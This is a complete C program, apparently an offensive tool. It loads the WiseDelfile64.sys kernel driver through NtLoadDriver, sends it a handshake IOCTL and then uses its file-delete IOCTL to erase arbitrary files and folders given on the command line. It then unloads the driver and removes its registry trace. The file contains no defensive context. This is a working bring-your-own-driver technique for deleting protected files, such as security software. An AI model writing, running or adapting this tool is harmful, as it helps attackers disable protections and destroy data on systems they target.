#include <windows.h>
#include <winternl.h>

// WiseDelfile64.sys SHA256: 8c4c6cc6685a719ac4e6119e1dac4ba029eba21720d5c3ca340006c9113cc6df

#define DEVICE_NAME L"\\\\.\\WiseDelfile"
#define HANDSHAKE_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DELFILE_IOCTL   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x001, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define HANDSHAKE_MAGIC 20
#define HANDSHAKE_STRING "WiseDelfile"

typedef NTSTATUS(NTAPI* NtLoadDriver_t)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING DriverServiceName);

#pragma pack(push, 1)
typedef struct {
    DWORD ProcessId;
    DWORD MagicValue;
    char  MagicString[24];
    BYTE  XorKey;
} HANDSHAKE_STRUCT;
#pragma pack(pop)

// --------------------- Helpers -----------------------
size_t wcslen(const wchar_t* str) {
    const wchar_t* s = str;
    while (*s) s++;
    return s - str;
}

wchar_t* wcscpy(wchar_t* dest, const wchar_t* src) {
    wchar_t* d = dest;
    while ((*d++ = *src++));
    return dest;
}

wchar_t* wcscat(wchar_t* dest, const wchar_t* src) {
    wchar_t* d = dest;
    while (*d) d++;
    while ((*d++ = *src++));
    return dest;
}

int wcscmp(const wchar_t* s1, const wchar_t* s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

void* memcpy(void* dest, const void* src, size_t n) {
    char* d = (char*)dest;
    const char* s = (const char*)src;
    for (size_t i = 0; i < n; i++) d[i] = s[i];
    return dest;
}

// Custom tokenization helpers
int IsDelimiter(wchar_t c, const wchar_t* delim) {
    while (*delim) {
        if (c == *delim) return 1;
        delim++;
    }
    return 0;
}

wchar_t* MyWcstok(wchar_t* str, const wchar_t* delim, wchar_t** context) {
    if (str) *context = str;
    wchar_t* p = *context;

    if (!p || *p == L'\0') return NULL;

    while (*p && IsDelimiter(*p, delim)) p++;
    if (*p == L'\0') return NULL;

    wchar_t* token = p;
    while (*p && !IsDelimiter(*p, delim)) p++;

    if (*p != L'\0') *p++ = L'\0';
    *context = p;
    return token;
}

void PrintW(const wchar_t* format, ...) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    wchar_t buffer[1024];
    int bIdx = 0;

    __builtin_va_list args;
    __builtin_va_start(args, format);

    for (int i = 0; format[i] != L'\0' && bIdx < 1023; i++) {
        if (format[i] == L'%') {
            i++;
            if (format[i] == L's') {
                const wchar_t* str = __builtin_va_arg(args, const wchar_t*);
                while (*str && bIdx < 1023) buffer[bIdx++] = *str++;
            }
        } else {
            buffer[bIdx++] = format[i];
        }
    }
    buffer[bIdx] = L'\0';
    __builtin_va_end(args);

    DWORD written;
    WriteConsoleW(hOut, buffer, (DWORD)bIdx, &written, NULL);
}

LPWSTR NextArg(LPWSTR* cmdLine) {
    LPWSTR arg;

    // Skip spaces
    while (**cmdLine == L' ')
        (*cmdLine)++;

    if (!**cmdLine)
        return NULL;

    // Quoted argument
    if (**cmdLine == L'"') {
        (*cmdLine)++;
        arg = *cmdLine;
        while (**cmdLine && **cmdLine != L'"')
            (*cmdLine)++;
        if (**cmdLine)
            *(*cmdLine)++ = L'\0';
    }
    // Unquoted argument
    else {
        arg = *cmdLine;
        while (**cmdLine && **cmdLine != L' ')
            (*cmdLine)++;
        if (**cmdLine)
            *(*cmdLine)++ = L'\0';
    }

    return arg;
}

// --------------------- Load/Unload Driver -----------------------
BOOL EnablePrivilege(const wchar_t* privilegeName) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    return result;
}

BOOL LoadDriver(HMODULE hNtdll, const wchar_t* serviceName, const wchar_t* driverPath) {
    HKEY hKey;
    WCHAR regPath[MAX_PATH * 2];
    WCHAR ntPath[MAX_PATH * 2];
    WCHAR ntImagePath[MAX_PATH * 2];

    if (!EnablePrivilege(L"SeLoadDriverPrivilege")) return FALSE;

    wcscpy(regPath, L"SYSTEM\\CurrentControlSet\\Services\\");
    wcscat(regPath, serviceName);

    DWORD disposition = 0;

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS)
        return FALSE;

    DWORD type = SERVICE_KERNEL_DRIVER;
    DWORD start = SERVICE_DEMAND_START;
    DWORD errorControl = SERVICE_ERROR_NORMAL;

    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(DWORD));
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&start, sizeof(DWORD));
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&errorControl, sizeof(DWORD));

    wcscpy(ntImagePath, L"\\??\\");
    wcscat(ntImagePath, driverPath);

    DWORD pathLen = (DWORD)((wcslen(ntImagePath) + 1) * sizeof(wchar_t));
    RegSetValueExW(hKey, L"ImagePath", 0, REG_SZ, (BYTE*)ntImagePath, pathLen);
    RegCloseKey(hKey);

    RegCloseKey(hKey);

    wcscpy(ntPath, L"\\Registry\\Machine\\");
    wcscat(ntPath, regPath);

    UNICODE_STRING uPath;
    uPath.Buffer = ntPath;
    uPath.Length = (USHORT)(wcslen(ntPath) * sizeof(wchar_t));
    uPath.MaximumLength = (USHORT)((wcslen(ntPath) + 1) * sizeof(wchar_t));

    NtLoadDriver_t NtLoadDriver = (NtLoadDriver_t)GetProcAddress(hNtdll, "NtLoadDriver");

    BOOL success = (NtLoadDriver && NT_SUCCESS(NtLoadDriver(&uPath)));

    if (!success && disposition == REG_CREATED_NEW_KEY)
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, regPath);

    return success;
}

BOOL UnloadDriver(HMODULE hNtdll, const wchar_t* serviceName) {
    WCHAR regPath[MAX_PATH * 2];
    WCHAR ntPath[MAX_PATH * 2];

    wcscpy(regPath, L"SYSTEM\\CurrentControlSet\\Services\\");
    wcscat(regPath, serviceName);

    wcscpy(ntPath, L"\\Registry\\Machine\\");
    wcscat(ntPath, regPath);

    UNICODE_STRING uPath;
    uPath.Buffer = ntPath;
    uPath.Length = (USHORT)(wcslen(ntPath) * sizeof(wchar_t));
    uPath.MaximumLength = (USHORT)((wcslen(ntPath) + 1) * sizeof(wchar_t));

    NtUnloadDriver_t NtUnloadDriver = (NtUnloadDriver_t)GetProcAddress(hNtdll, "NtUnloadDriver");

    if (!NtUnloadDriver) return FALSE;

    NTSTATUS status = NtUnloadDriver(&uPath);

    RegDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);

    return NT_SUCCESS(status);
}

// --------------------- Driver IOCTL -----------------------
void DriverHandshake(HANDLE hDevice) {
    HANDSHAKE_STRUCT inputBuffer = { 0 };
    
    inputBuffer.ProcessId = GetCurrentProcessId();
    inputBuffer.MagicValue = HANDSHAKE_MAGIC;
    
    memcpy(inputBuffer.MagicString, HANDSHAKE_STRING, sizeof(HANDSHAKE_STRING));

    DWORD bytesReturned = 0;
    
    DeviceIoControl(hDevice, HANDSHAKE_IOCTL, &inputBuffer, sizeof(inputBuffer), &inputBuffer, sizeof(DWORD), &bytesReturned, NULL);
}

BOOL DriverDelete(HANDLE hDevice, const wchar_t* targetFile) {
    wchar_t ntPath[MAX_PATH * 2];
    wcscpy(ntPath, L"\\??\\");
    wcscat(ntPath, targetFile);

    DWORD bytesReturned;
    BOOL ok = DeviceIoControl(hDevice, DELFILE_IOCTL, ntPath, (DWORD)((wcslen(ntPath) + 1) * sizeof(wchar_t)), ntPath, sizeof(DWORD), &bytesReturned, NULL);
    
    return (ok && bytesReturned == 1);
}

// --------------------- Delete File/Folder -----------------------
void DeleteDirectoryRecursive(HANDLE hDevice, const wchar_t* dirPath) {
    wchar_t searchPath[MAX_PATH * 2];
    wcscpy(searchPath, dirPath);
    wcscat(searchPath, L"\\*");

    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(searchPath, &fd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.cFileName[0] == L'.') continue;

        wchar_t fullPath[MAX_PATH * 2];
        wcscpy(fullPath, dirPath);
        wcscat(fullPath, L"\\");
        wcscat(fullPath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            DeleteDirectoryRecursive(hDevice, fullPath);
            
            if (!RemoveDirectoryW(fullPath)) {
                PrintW(L"[-] Failed to delete folder: %s\n", fullPath);
            } else {
                PrintW(L"[+] Deleted folder: %s\n", fullPath);
            }
        } else {
            if (DriverDelete(hDevice, fullPath)) {
                PrintW(L"[+] Deleted file: %s\n", fullPath);
            } else {
                PrintW(L"[-] Failed to delete file: %s\n", fullPath);
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);
}

void ProcessTarget(HANDLE hDevice, wchar_t* targetFile, BOOL recursive) {
    DWORD targetAttrib = GetFileAttributesW(targetFile);
    if (targetAttrib == INVALID_FILE_ATTRIBUTES) {
        PrintW(L"[-] Path not found: %s\n", targetFile);
        return;
    }

    if ((targetAttrib & FILE_ATTRIBUTE_DIRECTORY) && !recursive) {
        PrintW(L"[-] Target is a directory. Use -folder to delete: %s\n", targetFile);
        return;
    }

    if (targetAttrib & FILE_ATTRIBUTE_DIRECTORY) {
        DeleteDirectoryRecursive(hDevice, targetFile);
        if (RemoveDirectoryW(targetFile)) {
            PrintW(L"[+] Deleted folder: %s\n", targetFile);
        }
    } else {
        if (DriverDelete(hDevice, targetFile)) {
            PrintW(L"[+] Successfully deleted: %s\n", targetFile);
        } else {
            PrintW(L"[-] Failed to delete: %s\n", targetFile);
        }
    }
}

void mainCRTStartup() {
    LPWSTR cmdLine = GetCommandLineW();
    NextArg(&cmdLine);

    BOOL recursive = FALSE;
    LPWSTR targetFileList = NULL;
    LPWSTR currentArg = NULL;

    while ((currentArg = NextArg(&cmdLine)) != NULL) {
        if (wcscmp(currentArg, L"-folder") == 0) {
            recursive = TRUE;
        } 
        else if (targetFileList == NULL) {
            targetFileList = currentArg;
        }
    }

    if (targetFileList == NULL) {
        wchar_t exePath[MAX_PATH * 2];
        GetModuleFileNameW(NULL, exePath, MAX_PATH * 2);
        
        wchar_t* progName = exePath;
        wchar_t* p = exePath;
        while (*p) {
            if (*p == L'\\' || *p == L'/') progName = p + 1;
            p++;
        }

        PrintW(L"Usage: %s <path1,path2,...> [-folder]\n", progName);
        ExitProcess(0);
    }

    wchar_t driverPath[MAX_PATH * 2];
    
    GetModuleFileNameW(NULL, driverPath, MAX_PATH * 2);
    
    wchar_t* p = driverPath;
    while (*p) ++p;
    while (p > driverPath && *p != L'\\' && *p != L'/') --p;
    *p = L'\0';
    
    wcscat(driverPath, L"\\WiseDelfile64.sys");

    const wchar_t* serviceName = L"WiseDelfile";
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    
    BOOL driverLoaded = FALSE;
    
    for (int i = 0; i < 2; i++) {
        hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    
        if (hDevice != INVALID_HANDLE_VALUE)
            break;

        if (i == 0) {
            DWORD driverAttrib = GetFileAttributesW(driverPath);
            if (driverAttrib == INVALID_FILE_ATTRIBUTES || (driverAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
                PrintW(L"[-] Driver file not found: %s\n", driverPath);
                ExitProcess(-1);
            }

            if (!LoadDriver(hNtdll, serviceName, driverPath)) {
                PrintW(L"[-] Failed to Load Driver: %s\n", driverPath);
                ExitProcess(-1);
            }
            driverLoaded = TRUE;
        }
    }
    
    if (hDevice != INVALID_HANDLE_VALUE) {
        DriverHandshake(hDevice);

        wchar_t* context = NULL;
        wchar_t* token = MyWcstok(targetFileList, L",", &context);
        
        while (token != NULL) {
            ProcessTarget(hDevice, token, recursive);
            token = MyWcstok(NULL, L",", &context);
        }
        
        CloseHandle(hDevice);
    } else {
        PrintW(L"[-] Unable to obtain device handle: %s\n", DEVICE_NAME);
    }

    if (driverLoaded)
        UnloadDriver(hNtdll, serviceName);

    ExitProcess(0);
}
